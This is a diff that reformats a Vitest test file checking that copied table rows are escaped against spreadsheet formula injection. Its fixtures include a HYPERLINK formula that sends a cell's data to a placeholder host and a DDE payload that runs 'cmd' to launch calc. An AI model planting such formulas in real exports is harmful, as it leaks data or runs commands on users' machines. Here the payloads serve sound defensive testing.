@@ -1,5 +1,13 @@
 import { describe, expect, it } from "vitest";
-import { cellText, columnToText, copyColumnsFor, rowsToTsv, spreadsheetSafe, tsvField, type CopyColumn } from "./copyResults";
+import {
+	cellText,
+	columnToText,
+	copyColumnsFor,
+	rowsToTsv,
+	spreadsheetSafe,
+	tsvField,
+	type CopyColumn,
+} from "./copyResults";
 
 const FV = "@OData.Community.Display.V1.FormattedValue";
 const GUID = "11111111-1111-1111-1111-111111111111";
@@ -105,7 +113,12 @@ describe("columnToText", () => {
 
 describe("spreadsheet formulas in copied rows (#208)", () => {
 	const formulaRows: Record<string, unknown>[] = [
-		{ name: '=HYPERLINK("https://example.invalid/?d="&A2,"Click")', revenue: -5, [`revenue${FV}`]: "-$5.00", description: "@SUM(A1:A2)" },
+		{
+			name: '=HYPERLINK("https://example.invalid/?d="&A2,"Click")',
+			revenue: -5,
+			[`revenue${FV}`]: "-$5.00",
+			description: "@SUM(A1:A2)",
+		},
 		{ name: "+cmd|' /C calc'!A0", revenue: 3, description: "-2+3" },
 		{ name: "\tindented", revenue: null, description: "plain text" },
 	];
@@ -140,9 +153,11 @@ describe("spreadsheet formulas in copied rows (#208)", () => {
 
 	it("neutralises copied rows, as shown and raw", () => {
 		const shown = rowsToTsv(formulaRows, [name, revenue, description]).split("\n");
-		expect(shown[1]).toBe(`"'=HYPERLINK(""https://example.invalid/?d=""&A2,""Click"")"\t-$5.00\t'@SUM(A1:A2)`);
+		expect(shown[1]).toBe(
+			`"'=HYPERLINK(""https://example.invalid/?d=""&A2,""Click"")"\t-$5.00\t'@SUM(A1:A2)`,
+		);
 		expect(shown[2]).toBe("'+cmd|' /C calc'!A0\t3\t'-2+3");
-		expect(shown[3]).toBe("\"'\tindented\"\t\tplain text");
+		expect(shown[3]).toBe('"\'\tindented"\t\tplain text');
 		expect(rowsToTsv(formulaRows, [revenue], "raw").split("\n")[1]).toBe("-5");
 	});
 
